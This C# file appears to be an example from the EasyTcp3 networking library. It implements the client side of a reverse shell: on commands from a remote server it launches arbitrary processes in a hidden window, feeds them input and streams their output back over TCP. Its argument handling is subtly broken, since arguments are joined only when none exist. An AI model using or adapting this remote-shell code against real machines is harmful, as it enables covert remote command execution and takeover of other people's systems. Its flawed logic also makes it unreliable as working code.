using System.Diagnostics;
using System.Linq;
using EasyTcp3.Actions;
using EasyTcp3.ClientUtils;
using EasyTcp3.EasyTcpPacketUtils;

namespace EasyTcp3.Examples.ReverseShell.Client.Actions
{
    /// <summary>
    /// Actions that add support for a remote shell 
    /// </summary>
    public class ShellActions
    {
        /// <summary>
        /// Running process
        /// </summary>
        private Process _process;

        /// <summary>
        /// Start a new process,
        /// old process gets disposed 
        /// </summary>
        [EasyTcpAction("execute")]
        public void Execute(object s, Message e)
        {
            _process?.Dispose(); // Dispose old process if possible
            _process = CreateProcess(e);
            e.Client.Send("Created new process");
        }

        /// <summary>
        /// Pipe string into stdin of process 
        /// </summary>
        [EasyTcpAction(">")]
        public void PipeIntoProcess(object s, Message e)
            => _process?.StandardInput.WriteLine(e.Decompress().ToString().Replace(':',' '));

        /// <summary>
        /// Create a new process
        /// </summary>
        /// <returns>new created process</returns>
        private Process CreateProcess(Message e)
        {
            var args = e.Decompress().ToString().Split(':');

            var startInfo = new ProcessStartInfo()
            {
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                FileName = args[0],
                Arguments = !args.Any() ? string.Join(' ', args) : "",
                WindowStyle = ProcessWindowStyle.Hidden
            };

            var p = Process.Start(startInfo);
            p.OutputDataReceived += (s, a) => e.Client.Send(a.Data);
            p.BeginOutputReadLine();
            p.ErrorDataReceived += (s, a) => e.Client.Send(a.Data);
            p.BeginErrorReadLine();
            return p;
        }
    }
}